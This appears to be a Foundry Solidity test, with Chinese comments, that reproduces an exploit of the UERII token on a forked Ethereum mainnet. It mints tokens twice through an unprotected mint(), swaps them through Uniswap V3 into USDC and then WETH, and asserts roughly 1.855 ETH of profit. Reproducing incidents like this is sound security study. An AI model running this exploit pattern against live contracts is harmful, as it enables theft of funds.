// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Counter.sol";

interface IToken {
    //Functions in interfaces must be declared external.
    function mint() external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function withdraw(uint wad) external;
}

interface IUniswapV3Router {
    struct ExactInputSingleParams {
      address tokenIn;
      address tokenOut;
      uint24 fee;
      address recipient;
      uint256 deadline;
      uint256 amountIn;
      uint256 amountOutMinimum;
      uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract AttackTest is Test {
    uint256 forkId;

    address private UERII_address = 0x418C24191aE947A78C99fDc0e45a1f96Afb254BE;
    IToken UERII;

    address private UniswapV3Router_address = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    IUniswapV3Router UniswapV3Router;

    address private USDC_address = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    IToken USDC;

    address private WETH_address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IToken WETH;

    //有些初始化可以写里面，定义啥的
    function setUp() public {
        //fork block num 15767838
        //对于rpc节点，以太坊就 alchemy，bsc 就 quicknode
        forkId = vm.createFork("https://eth-mainnet.g.alchemy.com/v2/{key}", 15767837);  //区块号必须减 1
        //实例化合约
        UERII = IToken(UERII_address);
        USDC = IToken(USDC_address);
        WETH = IToken(WETH_address);
        UniswapV3Router = IUniswapV3Router(UniswapV3Router_address);

        vm.selectFork(forkId);
    }

    //测试fork 15767837 区块是否成功，区块号必须减 1
    function testBlockNum() public {
        /* assertEq(block.number, 15767837); */
    }

    //mint两次
    function mintUERII() public {
        /* uint256 before_num = UERII.balanceOf(address(this));
        console.log(before_num); // or `console2` */

        UERII.mint();
        UERII.mint();

        /*uint256 after_num = UERII.balanceOf(address(this));
        console.log(after_num);

        assertEq(after_num - before_num, 200000000000000000); */
    }

    //Swap 2,425,482.740776 $UERII For 2,447.241739 $USDC On Uniswap V3
    function swapUSDC() public{

        //uint256 before_num1 = USDC.balanceOf(address(this));
        UERII.approve(UniswapV3Router_address, 115792089237316195423570985008687907853269984665640564039457584007913129639935);
        //console.log(before_num1); // or `console2` */

        //对于结构体，直接接口引用，而非实例化之后引用。方法需要实例化后引用
        IUniswapV3Router.ExactInputSingleParams memory s = IUniswapV3Router.ExactInputSingleParams({
          tokenIn:UERII_address,
          tokenOut:USDC_address,
          fee:500,
          recipient:address(this),
          deadline:1666009991,
          amountIn:1079757573000057,
          amountOutMinimum:0,
          sqrtPriceLimitX96:0
        });

        UniswapV3Router.exactInputSingle(s);
        //uint256 after_num1 = USDC.balanceOf(address(this));
        //console.log(after_num1);
    }

    //Swap 2,447.241739 $USDC For 1.855150444286128408Ether On Uniswap V3
    function swapWETH() public{

        /* uint256 before_num2 = WETH.balanceOf(address(this));
        console.log(before_num2); // */

        USDC.approve(UniswapV3Router_address, 115792089237316195423570985008687907853269984665640564039457584007913129639935);
        IUniswapV3Router.ExactInputSingleParams memory s1 = IUniswapV3Router.ExactInputSingleParams({
          tokenIn:USDC_address,
          tokenOut:WETH_address,
          fee:500,
          recipient:address(this),
          deadline:1666009991,
          amountIn:2447241739,
          amountOutMinimum:0,
          sqrtPriceLimitX96:0
        });
        UniswapV3Router.exactInputSingle(s1);

        /* uint256 after_num2 = WETH.balanceOf(address(this));
        console.log(after_num2); */
    }

    function testSwap() public {
        uint ETH_before = address(this).balance;

        mintUERII();
        //console.log(UERII.balanceOf(address(this)));

        swapUSDC();
        //console.log(USDC.balanceOf(address(this)));

        swapWETH();
        //console.log(WETH.balanceOf(address(this)));

        WETH.withdraw(WETH.balanceOf(address(this)));
        //console.log(address(this).balance);
        //assertEq(address(this).balance, 1855150444286128408); //不能这样，本身合约就有很多ETH

        uint ETH_after = address(this).balance;
        assertEq(ETH_after-ETH_before, 1855150444286128408);
    }

    receive() external payable {}
}
